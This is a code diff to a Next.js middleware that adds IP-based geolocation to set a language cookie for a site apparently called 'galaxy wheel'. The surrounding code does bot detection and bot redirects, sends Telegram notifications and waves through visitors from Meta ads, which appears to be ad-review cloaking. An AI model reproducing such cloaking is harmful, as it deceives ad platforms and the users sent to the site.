@@ -2,8 +2,9 @@ import { NextRequest, NextResponse } from 'next/server';
 import { detectBot, logBotDetection } from '@/utils/botDetection';
 import { getBotRedirectConfig } from '@/utils/botRedirects';
 import { telegramNotifier } from '@/utils/telegramEnhanced';
+import { getLocationByIp } from '@/utils/geolocation';
 
-export function middleware(request: NextRequest) {
+export async function middleware(request: NextRequest) {
   const userAgent = request.headers.get('user-agent') || '';
   const accept = request.headers.get('accept') || '';
   const acceptLanguage = request.headers.get('accept-language') || '';
@@ -28,6 +29,25 @@ export function middleware(request: NextRequest) {
   if (isFromMetaAds) {
     console.log(`✅ Allowing user from Meta ads: ${referer}`);
     return NextResponse.next();
+  }
+  
+  // Проверяем, есть ли кука с языком
+  const languageCookie = request.cookies.get('galaxy_wheel_language');
+  if (!languageCookie) {
+    // Получаем IP пользователя
+    const ip = (request.headers.get('x-forwarded-for') ?? '127.0.0.1').split(',')[0];
+    // Определяем язык по IP
+    let language = 'en';
+    try {
+      const geo = await getLocationByIp(ip);
+      language = geo.language || 'en';
+    } catch (e) {
+      // fallback
+    }
+    // Устанавливаем куку с языком
+    const response = NextResponse.next();
+    response.cookies.set('galaxy_wheel_language', language, { path: '/', maxAge: 60 * 60 * 24 * 30 });
+    return response;
   }
   
   // Дополнительные проверки для более точного определения ботов
